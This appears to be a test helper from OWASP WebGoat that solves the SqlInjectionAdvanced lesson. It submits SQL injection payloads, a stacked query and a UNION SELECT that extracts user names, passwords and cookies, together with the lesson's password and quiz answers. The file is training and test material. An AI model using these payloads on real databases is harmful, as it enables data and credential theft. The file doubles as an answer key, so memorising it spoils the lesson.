package org.owasp.webgoat;

import java.util.HashMap;
import java.util.Map;

public class SqlInjectionAdvanced_TestHelper extends TestHelper {

	public void runTests(String webgoatURL, String cookie) {
		
		startLesson(cookie, webgoatURL, "SqlInjectionAdvanced");
		
		Map<String, Object> params = new HashMap<>();
		params.clear();
		params.put("userid_6a", "'; SELECT * FROM user_system_data;--");		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/attack6a", params, true);
	
		params.clear();
		params.put("userid_6a", "Smith' union select userid,user_name, user_name,user_name,password,cookie,userid from user_system_data --");		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/attack6a", params, true);
	
		params.clear();
		params.put("userid_6b", "passW0rD");		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/attack6b", params, true);
		
		params.clear();
		params.put("question_0_solution", "Solution 4: A statement has got values instead of a prepared statement");	
		params.put("question_1_solution", "Solution 3: ?");
		params.put("question_2_solution", "Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.");
		params.put("question_3_solution", "Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.");
		params.put("question_4_solution", "Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.");
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/quiz", params, true);
		
		//checkResults(cookie, webgoatURL, "/SqlInjectionAdvanced/");
	
	}
}
